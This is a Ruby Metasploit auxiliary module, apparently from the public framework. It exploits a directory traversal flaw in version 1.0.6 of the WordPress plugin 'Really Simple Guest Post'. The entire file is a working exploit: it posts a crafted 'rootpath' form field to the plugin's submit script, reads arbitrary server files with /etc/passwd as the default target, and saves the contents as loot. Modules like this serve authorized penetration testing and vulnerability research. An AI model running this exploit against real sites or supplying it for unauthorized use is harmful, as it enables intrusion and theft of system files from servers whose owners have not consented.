##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Really Simple Guest Post File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress
        Plugin "Really Simple Guest Post" version 1.0.6, allowing to read
        arbitrary files with the web server privileges.
      },
      'References'     =>
        [
          ['EDB', '37209'],
          ['WPVDB', '8036']
        ],
      'Author'         =>
        [
          'Kuroi\'SH', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('really-simple-guest-post', '1.0.7')
  end

  def run_host(ip)

    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\/\//

    data = Rex::MIME::Message.new
    data.add_part("#{filename}", 'application/octet-stream', nil, 'form-data; name="rootpath"')
    post_data = data.to_s


    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(wordpress_url_plugins, 'really-simple-guest-post', 'simple-guest-post-submit.php'),
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => post_data
    )

    if res &&
        res.code == 500 &&
        res.body.length > 0 &&
        res.headers['Content-Length'].to_i > 0

      vprint_status('Downloading file...')
      vprint_line("\n#{res.body}")
      fname = datastore['FILEPATH']

      path = store_loot(
        'reallysimpleguest.traversal',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try to change the FILEPATH parameter.")
    end
  end
end
